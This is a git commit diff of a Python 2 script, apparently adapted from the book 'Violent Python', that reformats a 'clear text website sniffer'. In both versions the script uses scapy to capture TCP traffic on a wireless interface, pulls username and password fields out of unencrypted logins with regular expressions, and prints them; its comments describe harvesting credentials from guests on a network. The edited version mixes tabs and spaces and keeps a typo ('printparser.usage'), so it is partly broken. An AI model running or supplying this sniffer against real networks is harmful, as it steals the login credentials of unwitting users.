0a834e8af1bd5db2c1ae27c09c106409cb8d7e95
Moses Arocha <carocha24@gmail.com>
2016-09-02 10:01:14 -0500

    Update

--- Clear_Text_Website_Sniffer.py
+++ Clear_Text_Website_Sniffer.py
@@ -1,35 +1,35 @@
 #!/usr/bin/env python2
 # written by Moses Arocha
 # Written with the help of TJ O'Connor in his book "Violent Python"
-# This code attempts to sniff a wireless connection and grab any username and password entered that is unencrypted 
+# This code attempts to sniff a wireless connection and grab any username and password entered that is unencrypted.
 
 import optparse
 from scapy.all import *
 
-def findCredentials(pkt):			# Attempts to find the credentials of Users who login to a website
-  	raw = pkt.sprintf('%Raw.load%')						
- 	Username = re.findall('(?i)username=(.*)&', raw)			# grabs the username from the raw stack of data transmitted
-  	Password = re.findall("(?i)password=(.*)'", raw)			# grabs the password from the raw stack of data transmitted
-	if Username:
-    		print '\n\t[Success] Found Login User ' + str(Username[0]) + ', Password: ' + str(Password[0])	# If username has been successfully found and grabbed, it is then displayed to the user
+def findCredentials(pkt):	
+    raw = pkt.sprintf('%Raw.load%')						
+    Username = re.findall('(?i)username=(.*)&', raw)			# grabs the username from the raw stack of data transmitted
+    Password = re.findall("(?i)password=(.*)'", raw)			# grabs the password from the raw stack of data transmitted
+    if Username:
+        print '\n\t[Success] Found Login User ' + str(Username[0]) + ', Password: ' + str(Password[0])	
+        # The only output the user ever sees.
 
-## The main function asks for the interface the user wishes to monitor as guests login to the network, it then grabs the Username and Password the guests have provided and displays this ##
 def main():
-	parser = optparse.OptionParser('Uses Of Program: -i <Interface>') # The default interface is wlan0
-	parser.add_option('-i', dest='interface', type='string', help='Specify Interface To Listen On', default='wlan0') 
-	(options, args) = parser.parse_args()
-	if options.interface == None:
-		printparser.usage
-		exit(0)
-	else:
-		conf.iface = options.interface
-	if not os.geteuid() == 0:
-		sys.exit('Must Be Root!')					 # This code checks to see if a user is root
-	try:
-		print '\n\n\t[Starting] Starting Clear Text Website Sniffer'
-		sniff(filter='tcp', prn=findCredentials, store=0)
-	except KeyboardInterrupt:						# The program is stopped if the user types keys
-		exit(0)
+    if not os.geteuid() == 0:
+        sys.exit('Must Be Root!')					 # The User must have UID 0 enabled.
+    parser = optparse.OptionParser('Uses Of Program: -i <Interface>') 
+    parser.add_option('-i', dest='interface', type='string', help='Specify Interface To Listen On', default='wlan0') 
+    (options, args) = parser.parse_args()
+    if options.interface == None:
+        printparser.usage
+	exit(0)
+    else:
+	conf.iface = options.interface
+    try:
+        print '\n\n\t[Starting] Starting Clear Text Website Sniffer'
+	sniff(filter='tcp', prn=findCredentials, store=0)
+    except KeyboardInterrupt:						# The program is stopped if the user types any keys.
+	exit(0)
 	
 if __name__ == '__main__':
-	main()
+     main()
